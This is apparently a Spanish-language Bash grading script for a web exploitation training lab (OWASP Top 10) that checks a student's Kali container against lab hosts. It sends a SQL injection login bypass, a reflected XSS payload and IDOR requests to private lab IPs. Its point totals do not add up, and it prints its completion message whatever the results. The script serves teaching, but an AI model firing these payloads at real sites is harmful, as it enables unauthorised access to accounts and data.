#!/bin/bash
# ================================================
# Script de Validación - Lab webapp-01
# Explotación Web — OWASP Top 10
# ================================================

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

SCORE=0
TOTAL=5
EXERCISES_PASSED=0

echo -e "${BLUE}╔══════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║   VALIDACIÓN - Lab webapp-01: Web Exploit ║${NC}"
echo -e "${BLUE}╚══════════════════════════════════════════╝${NC}"
echo ""

check_result() {
    local test_name="$1"
    local result="$2"
    local points="$3"

    if [ "$result" = "PASS" ]; then
        echo -e "${GREEN}✓${NC} $test_name ${GREEN}+${points} XP${NC}"
        SCORE=$((SCORE + points))
        EXERCISES_PASSED=$((EXERCISES_PASSED + 1))
    else
        echo -e "${RED}✗${NC} $test_name ${RED}(0 XP)${NC}"
    fi
}

# ============================================
# Verificar servicios
# ============================================
echo -e "${YELLOW}━━━ Verificando servicios ━━━${NC}"

if docker compose exec kali curl -s -o /dev/null -w "%{http_code}" http://10.0.4.10/ | grep -q "200"; then
    check_result "Web App accessible" "PASS" 0
else
    check_result "Web App accessible" "FAIL" 0
fi

if docker compose exec kali curl -s -o /dev/null -w "%{http_code}" http://10.0.4.20/api/config | grep -q "200"; then
    check_result "API accessible" "PASS" 0
else
    check_result "API accessible" "FAIL" 0
fi

echo ""

# ============================================
# Ejercicio 2: SQL Injection Login (50 XP)
# ============================================
echo -e "${YELLOW}━━━ Ejercicio 2: SQL Injection Login ━━━${NC}"

SQLI_RESULT=$(docker compose exec kali curl -s -d "user=admin'--&pass=anything" http://10.0.4.10/login.php 2>/dev/null || true)
if echo "$SQLI_RESULT" | grep -qi "dashboard\|welcome\|logged"; then
    check_result "SQLi Login bypass exitoso" "PASS" 50
else
    check_result "SQLi Login bypass exitoso" "FAIL" 50
fi

echo ""

# ============================================
# Ejercicio 4: XSS Reflejado (50 XP)
# ============================================
echo -e "${YELLOW}━━━ Ejercicio 4: XSS Reflejado ━━━${NC}"

XSS_RESULT=$(docker compose exec kali curl -s "http://10.0.4.10/search.php?q=%3Cscript%3Ealert(1)%3C/script%3E" 2>/dev/null || true)
if echo "$XSS_RESULT" | grep -q "<script>alert(1)</script>"; then
    check_result "XSS reflejado - payload sin sanitizar" "PASS" 50
else
    check_result "XSS reflejado - payload sin sanitizar" "FAIL" 50
fi

echo ""

# ============================================
# Ejercicio 6: IDOR (50 XP)
# ============================================
echo -e "${YELLOW}━━━ Ejercicio 6: IDOR ━━━${NC}"

IDOR_RESULT=$(docker compose exec kali curl -s http://10.0.4.20/api/users/1 2>/dev/null || true)
if echo "$IDOR_RESULT" | grep -q "admin"; then
    check_result "IDOR - datos de usuario obtenidos" "PASS" 25
else
    check_result "IDOR - datos de usuario obtenidos" "FAIL" 25
fi

IDOR2=$(docker compose exec kali curl -s http://10.0.4.20/api/users/2 2>/dev/null || true)
if echo "$IDOR2" | grep -q "user1"; then
    check_result "IDOR - acceso a otro usuario" "PASS" 25
else
    check_result "IDOR - acceso a otro usuario" "FAIL" 25
fi

echo ""

# ============================================
# Resultados Finales
# ============================================
echo -e "${BLUE}╔══════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║           RESULTADOS FINALES             ║${NC}"
echo -e "${BLUE}╚══════════════════════════════════════════╝${NC}"
echo ""
echo -e "Verificaciones pasadas: ${GREEN}$EXERCISES_PASSED${NC}/$TOTAL"
echo -e "Puntuación parcial:     ${GREEN}$SCORE${NC}/400 XP"
echo ""
echo -e "${GREEN}🎉 ¡Has completado todos los labs de módulos 01-04!${NC}"
echo ""
